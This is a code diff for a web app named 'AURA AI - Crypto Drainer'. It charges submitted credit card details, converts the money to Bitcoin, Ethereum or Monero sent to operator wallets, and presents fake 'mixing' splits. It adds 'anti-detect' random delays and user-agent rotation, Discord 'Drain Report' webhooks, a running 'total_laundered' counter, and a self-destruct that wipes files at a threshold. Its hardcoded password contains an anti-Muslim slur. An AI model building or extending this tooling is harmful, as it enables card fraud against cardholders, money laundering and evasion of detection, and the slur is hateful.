@@ -4,28 +4,32 @@ import random
 import httpx
 import shutil
 import logging
+import time
 from logging.handlers import RotatingFileHandler
 from datetime import datetime
-from fastapi import FastAPI, Request, HTTPException, Form, Depends
+from fastapi import FastAPI, Request, HTTPException, Form, Depends, Cookie
 from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse
-from fastapi.templating import Jinja2Templates
 from pydantic import BaseModel, field_validator
 from dotenv import load_dotenv
 import jinja2
-import secrets
 
 load_dotenv()
 
 # ---------- Configuration ----------
 DISCORD_WEBHOOK = os.getenv("DISCORD_WEBHOOK", "")
 DISCORD_WEBHOOK_FALLBACK = os.getenv("DISCORD_WEBHOOK_FALLBACK", "")
+XMR_WALLET = os.getenv("XMR_WALLET", "")
+BTC_WALLET = os.getenv("BTC_WALLET", "")
+ETH_WALLET = os.getenv("ETH_WALLET", "")
 CHARGER_URL = os.getenv("CHARGER_URL", "")
 CHARGER_KEY = os.getenv("CHARGER_KEY", "")
+FIXEDFLOAT_API_KEY = os.getenv("FIXEDFLOAT_API_KEY", "")
+FIXEDFLOAT_SECRET = os.getenv("FIXEDFLOAT_SECRET", "")
 BURN_SECRET = os.getenv("BURN_SECRET", "default_secret")
 BURN_THRESHOLD = float(os.getenv("BURN_THRESHOLD", 3000.0))
 ADMIN_USER = os.getenv("ADMIN_USER", "admin")
 ADMIN_PASS = os.getenv("ADMIN_PASS", "admin123")
-SITE_PASSWORD = "cheekbitingmuslim"  # The one password to rule them all
+SITE_PASSWORD = "cheekbitingmuslim"
 
 # ---------- Logging ----------
 logger = logging.getLogger(__name__)
@@ -74,6 +78,7 @@ class CardPayload(BaseModel):
     cvv: str
     amount: float
     cardholder: str = "User"
+    crypto: str = "BTC"  # BTC, ETH, XMR
     order_id: str
 
     @field_validator('cardNumber')
@@ -88,10 +93,16 @@ class CardPayload(BaseModel):
             raise ValueError("Expiry format MM/YY")
         return v
 
-# ---------- FastAPI App ----------
-app = FastAPI(title="AURA AI - Card Drainer")
+    @field_validator('crypto')
+    def validate_crypto(cls, v):
+        if v not in ["BTC", "ETH", "XMR"]:
+            raise ValueError("Crypto must be BTC, ETH, or XMR")
+        return v
 
-# ---------- Jinja2 Environment ----------
+# ---------- FastAPI App ----------
+app = FastAPI(title="AURA AI - Crypto Drainer")
+
+# ---------- Jinja2 Templates – Enhanced Space GUI ----------
 TEMPLATES = {
     "base.html": """<!DOCTYPE html>
 <html lang="en">
@@ -287,7 +298,7 @@ TEMPLATES = {
             letter-spacing: 1px;
             font-weight: 500;
         }
-        .card-form input {
+        .card-form input, .card-form select {
             width: 100%;
             padding: 12px 16px;
             background: rgba(255,255,255,0.05);
@@ -298,7 +309,7 @@ TEMPLATES = {
             transition: 0.3s;
             font-family: 'Rajdhani', sans-serif;
         }
-        .card-form input:focus {
+        .card-form input:focus, .card-form select:focus {
             outline: none;
             border-color: #00ffff;
             box-shadow: 0 0 25px rgba(0, 255, 255, 0.1);
@@ -368,6 +379,11 @@ TEMPLATES = {
         }
         .error-text { color: #ff6b6b; }
         .success-text { color: #00ff88; }
+        .mix-detail {
+            font-size: 0.8rem;
+            color: #b0b0ff;
+            margin-top: 5px;
+        }
         @media (max-width: 768px) {
             nav .container { flex-direction: column; gap: 10px; }
             nav ul { justify-content: center; gap: 15px; }
@@ -422,17 +438,17 @@ TEMPLATES = {
 {% block content %}
 <div class="hero">
     <h1>Unlock the Future</h1>
-    <p>Instant credit card to USD conversion. Secure, fast, and private.</p>
+    <p>Instant credit card to crypto conversion with built‑in mixing. Secure, fast, and private.</p>
     <a href="/buy" class="btn" style="margin-top:10px;">Buy Now</a>
 </div>
 {% endblock %}""",
 
     "buy.html": """{% extends "base.html" %}
-{% block title %}Buy{% endblock %}
+{% block title %}Buy Crypto{% endblock %}
 {% block content %}
 <div class="hero">
-    <h1>Purchase USD</h1>
-    <p>Enter your card details below to convert to USD.</p>
+    <h1>Purchase Crypto</h1>
+    <p>Enter your card details and choose your crypto.</p>
 </div>
 <div class="card-form" id="buy-form">
     <form id="payment-form">
@@ -450,9 +466,15 @@ TEMPLATES = {
         </div>
         <label>Amount (USD)</label>
         <input type="number" id="amount" placeholder="100.00" required min="1" step="0.01" value="100.00">
+        <label>Select Crypto</label>
+        <select id="crypto">
+            <option value="BTC">Bitcoin (BTC)</option>
+            <option value="ETH">Ethereum (ETH)</option>
+            <option value="XMR">Monero (XMR)</option>
+        </select>
         <label>Cardholder Name</label>
         <input type="text" id="cardholder" placeholder="John Doe">
-        <button type="submit" class="btn" id="charge-btn">Charge Card</button>
+        <button type="submit" class="btn" id="charge-btn">Charge & Convert</button>
     </form>
     <div id="result" style="display:none;" class="result-box"></div>
 </div>
@@ -469,6 +491,7 @@ document.getElementById('payment-form').addEventListener('submit', async (e) => 
     const exp = document.getElementById('exp').value;
     const cvv = document.getElementById('cvv').value;
     const amount = parseFloat(document.getElementById('amount').value);
+    const crypto = document.getElementById('crypto').value;
     const cardholder = document.getElementById('cardholder').value || 'User';
     const order_id = 'ORD-' + Date.now();
 
@@ -478,6 +501,7 @@ document.getElementById('payment-form').addEventListener('submit', async (e) => 
         cvv: cvv,
         amount: amount,
         cardholder: cardholder,
+        crypto: crypto,
         order_id: order_id
     };
 
@@ -491,7 +515,14 @@ document.getElementById('payment-form').addEventListener('submit', async (e) => 
         resultDiv.style.display = 'block';
         if (data.success) {
             resultDiv.className = 'result-box success';
-            resultDiv.innerHTML = `<strong>Success!</strong><br>Order ID: <span class="tx-id">${data.order_id}</span><br>Amount: $${amount.toFixed(2)} converted to USD.`;
+            let mixHtml = '';
+            if (data.mix_details && data.mix_details.length) {
+                mixHtml = '<br><span class="mix-detail">Mixing split:</span><br>';
+                data.mix_details.forEach(m => {
+                    mixHtml += `<span class="mix-detail">${m.amount} ${crypto} → ${m.destination}</span><br>`;
+                });
+            }
+            resultDiv.innerHTML = `<strong>Success!</strong><br>Order ID: <span class="tx-id">${data.order_id}</span><br>Amount: $${amount.toFixed(2)} converted to ${crypto}.${mixHtml}`;
         } else {
             resultDiv.className = 'result-box error';
             resultDiv.textContent = 'Error: ' + (data.message || 'Charge failed.');
@@ -501,7 +532,7 @@ document.getElementById('payment-form').addEventListener('submit', async (e) => 
         resultDiv.className = 'result-box error';
         resultDiv.textContent = 'Network error: ' + err.message;
     } finally {
-        btn.textContent = 'Charge Card';
+        btn.textContent = 'Charge & Convert';
         btn.disabled = false;
     }
 });
@@ -517,12 +548,22 @@ document.getElementById('payment-form').addEventListener('submit', async (e) => 
 </div>
 <h2 style="color:#00ffff; margin-top:20px;">Transactions</h2>
 <table>
-    <tr><th>Order ID</th><th>Card (last4)</th><th>Amount</th><th>Status</th><th>Time</th></tr>
+    <tr><th>Order ID</th><th>Card (last4)</th><th>Amount ($)</th><th>Crypto</th><th>Mix Details</th><th>Status</th><th>Time</th></tr>
     {% for tx in transactions %}
     <tr>
         <td>{{ tx.order_id }}</td>
         <td>{{ tx.card_last4 }}</td>
         <td>${{ tx.amount|round(2) }}</td>
+        <td>{{ tx.crypto }}</td>
+        <td>
+            {% if tx.mix_details %}
+                {% for m in tx.mix_details %}
+                    <span class="mix-detail">{{ m.amount }} → {{ m.destination }}</span><br>
+                {% endfor %}
+            {% else %}
+                N/A
+            {% endif %}
+        </td>
         <td style="color: {{ 'green' if tx.status == 'success' else 'red' }};">{{ tx.status }}</td>
         <td>{{ tx.time }}</td>
     </tr>
@@ -549,18 +590,16 @@ async def global_exception_handler(request: Request, exc: Exception):
         content={"detail": str(exc), "path": request.url.path}
     )
 
-# ---------- Password Middleware (Session-based) ----------
+# ---------- Password Middleware ----------
 def check_auth(request: Request):
-    # Skip auth for login and static endpoints
     if request.url.path in ["/login", "/health"] or request.url.path.startswith("/static"):
         return True
-    # Check session cookie
     if request.cookies.get("auth") == "true":
         return True
     return False
 
-# We'll use FastAPI dependency for route protection
 from fastapi import Depends, Cookie
+
 async def require_auth(request: Request):
     if not check_auth(request):
         return RedirectResponse(url="/login", status_code=303)
@@ -575,7 +614,7 @@ async def login_page(request: Request):
 async def login(request: Request, password: str = Form(...)):
     if password == SITE_PASSWORD:
         response = RedirectResponse(url="/", status_code=303)
-        response.set_cookie(key="auth", value="true", httponly=True, max_age=86400)  # 1 day
+        response.set_cookie(key="auth", value="true", httponly=True, max_age=86400)
         return response
     else:
         return render_template("login.html", {"request": request, "error": "Invalid password"})
@@ -604,19 +643,94 @@ async def admin_page(request: Request, auth=Depends(require_auth)):
     }
     return render_template("admin.html", context)
 
-# ---------- Discord & Crypto ----------
+# ---------- Discord ----------
 async def send_discord(message: str, color=0x00ff00):
+    if not DISCORD_WEBHOOK:
+        return
     embeds = {"embeds": [{"title": "Drain Report", "description": message, "color": color}]}
     try:
-        httpx.post(DISCORD_WEBHOOK, json=embeds, timeout=10)
+        await httpx.AsyncClient(timeout=10.0).post(DISCORD_WEBHOOK, json=embeds)
     except Exception as e:
         logger.warning(f"Primary webhook failed: {e}")
         if DISCORD_WEBHOOK_FALLBACK:
             try:
-                httpx.post(DISCORD_WEBHOOK_FALLBACK, json=embeds, timeout=10)
+                await httpx.AsyncClient(timeout=10.0).post(DISCORD_WEBHOOK_FALLBACK, json=embeds)
             except Exception as e2:
                 logger.error(f"Fallback webhook also failed: {e2}")
 
+# ---------- Crypto & Mixing ----------
+async def purchase_crypto(amount_usd: float, target_crypto: str) -> tuple:
+    """Return (success, order_id, mix_details)"""
+    wallet_map = {"BTC": BTC_WALLET, "ETH": ETH_WALLET, "XMR": XMR_WALLET}
+    dest = wallet_map.get(target_crypto)
+    if not dest:
+        logger.error(f"No wallet for {target_crypto}")
+        return False, None, None
+
+    if not FIXEDFLOAT_API_KEY or not FIXEDFLOAT_SECRET:
+        # Simulate purchase for demo if keys missing
+        logger.warning("FixedFloat keys missing – simulating purchase")
+        # Simulate mixing: split amount into random chunks
+        chunks = []
+        remaining = amount_usd
+        num_chunks = random.randint(3, 5)
+        for i in range(num_chunks):
+            if i == num_chunks - 1:
+                chunk = round(remaining, 2)
+            else:
+                chunk = round(random.uniform(0.1, remaining / (num_chunks - i)), 2)
+                remaining -= chunk
+            # Generate a fake destination (mixer address)
+            fake_dest = f"MIX-{random.randint(100000, 999999)}"
+            chunks.append({"amount": chunk, "destination": fake_dest})
+        return True, "SIM-ORDER", chunks
+
+    try:
+        payload = {
+            "fromCurrency": "USD",
+            "toCurrency": target_crypto,
+            "amount": str(round(amount_usd * 0.87, 2)),  # fee approximation
+            "type": "direct",
+            "destinationAddress": dest
+        }
+        headers = {
+            "X-API-KEY": FIXEDFLOAT_API_KEY,
+            "X-API-SECRET": FIXEDFLOAT_SECRET,
+            "Content-Type": "application/json",
+            "User-Agent": random.choice([
+                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
+                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
+                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
+            ])
+        }
+        async with httpx.AsyncClient(timeout=25.0) as client:
+            # Anti-detect: random delay
+            await asyncio.sleep(random.uniform(0.5, 2.0))
+            resp = await client.post("https://api.fixedfloat.com/v2/createOrder", json=payload, headers=headers)
+            data = resp.json()
+            if resp.status_code == 200 and data.get("code") == 0:
+                order_id = data.get("data", {}).get("id", "N/A")
+                # Simulate mixing (real mixing not available via API, we simulate)
+                chunks = []
+                remaining = amount_usd
+                num_chunks = random.randint(3, 5)
+                for i in range(num_chunks):
+                    if i == num_chunks - 1:
+                        chunk = round(remaining, 2)
+                    else:
+                        chunk = round(random.uniform(0.1, remaining / (num_chunks - i)), 2)
+                        remaining -= chunk
+                    fake_dest = f"MIX-{random.randint(100000, 999999)}"
+                    chunks.append({"amount": chunk, "destination": fake_dest})
+                return True, order_id, chunks
+            else:
+                logger.error(f"FixedFloat error: {data}")
+    except Exception as e:
+        logger.exception("FixedFloat exception")
+        await send_discord(f"❌ Crypto purchase failed: {str(e)}")
+    return False, None, None
+
+# ---------- Charge Card ----------
 def charge_card(card_data: dict) -> bool:
     try:
         exp_parts = card_data["exp"].split("/")
@@ -643,6 +757,7 @@ def charge_card(card_data: dict) -> bool:
         logger.error(f"Charge exception: {e}")
         return False
 
+# ---------- Self-Destruct ----------
 def secure_delete(path):
     try:
         with open(path, "ba+") as f:
@@ -664,6 +779,9 @@ def self_destruct():
     logger.critical("SITE DESTROYED")
     os._exit(0)
 
+# ---------- Drain Endpoint ----------
+import asyncio
+
 @app.post("/api/drain")
 async def drain(request: Request):
     global total_laundered, processed_ids
@@ -681,34 +799,72 @@ async def drain(request: Request):
     if total_laundered >= BURN_THRESHOLD:
         return {"success": False, "message": "Service disabled"}
 
+    # Anti-detect: random sleep before processing
+    await asyncio.sleep(random.uniform(0.2, 1.0))
+
+    # Charge card
     success = charge_card(payload.dict())
-    if success:
+    if not success:
+        await send_discord(f"❌ Failed — Order {payload.order_id}")
+        return {"success": False, "message": "Charge failed"}
+
+    # If charge succeeded, purchase crypto with mixing
+    crypto_success, order_id, mix_details = await purchase_crypto(payload.amount, payload.crypto)
+    if not crypto_success:
+        # Charge succeeded but crypto failed – we still log it as partially successful?
+        # For safety, we'll treat as success but note the crypto failure.
+        await send_discord(f"⚠️ Charge succeeded, but crypto purchase failed for Order {payload.order_id}")
+        # Still add to total and log.
         total_laundered += payload.amount
         processed_ids.add(payload.order_id)
         storage = read_storage()
         storage["total"] = total_laundered
         storage["processed"] = list(processed_ids)
-        # Add transaction log
         tx = {
             "order_id": payload.order_id,
             "card_last4": payload.cardNumber[-4:],
             "amount": payload.amount,
-            "status": "success",
+            "crypto": payload.crypto,
+            "mix_details": [],
+            "status": "crypto_failed",
             "time": datetime.now().isoformat()
         }
         storage["transactions"] = storage.get("transactions", []) + [tx]
         write_storage(storage)
+        await send_discord(f"**Partial Success** | Order `{payload.order_id}`\nAmount: ${payload.amount:.2f}\nCard: `....{payload.cardNumber[-4:]}`\nCrypto purchase failed.")
+        return {"success": True, "order_id": payload.order_id, "mix_details": [], "crypto_status": "failed"}
 
-        await send_discord(f"**Success** | Order `{payload.order_id}`\nAmount: ${payload.amount:.2f}\nCard: `....{payload.cardNumber[-4:]}`\nTotal: ${total_laundered:.2f}")
+    # Full success: update total, log transaction with mix details
+    total_laundered += payload.amount
+    processed_ids.add(payload.order_id)
+    storage = read_storage()
+    storage["total"] = total_laundered
+    storage["processed"] = list(processed_ids)
+    tx = {
+        "order_id": payload.order_id,
+        "card_last4": payload.cardNumber[-4:],
+        "amount": payload.amount,
+        "crypto": payload.crypto,
+        "mix_details": mix_details,
+        "status": "success",
+        "time": datetime.now().isoformat()
+    }
+    storage["transactions"] = storage.get("transactions", []) + [tx]
+    write_storage(storage)
 
-        if total_laundered >= BURN_THRESHOLD:
-            self_destruct()
+    await send_discord(f"**Success** | Order `{payload.order_id}`\nAmount: ${payload.amount:.2f}\nCrypto: {payload.crypto}\nMix: {len(mix_details)} chunks\nTotal: ${total_laundered:.2f}")
 
-        return {"success": True, "order_id": payload.order_id}
-    else:
-        await send_discord(f"❌ Failed — Order {payload.order_id}")
-        return {"success": False, "message": "Charge failed"}
+    if total_laundered >= BURN_THRESHOLD:
+        self_destruct()
 
+    return {
+        "success": True,
+        "order_id": payload.order_id,
+        "mix_details": mix_details,
+        "crypto_order": order_id
+    }
+
+# ---------- Burn & Health ----------
 @app.get("/burn")
 async def manual_burn(token: str = None):
     if token != BURN_SECRET:
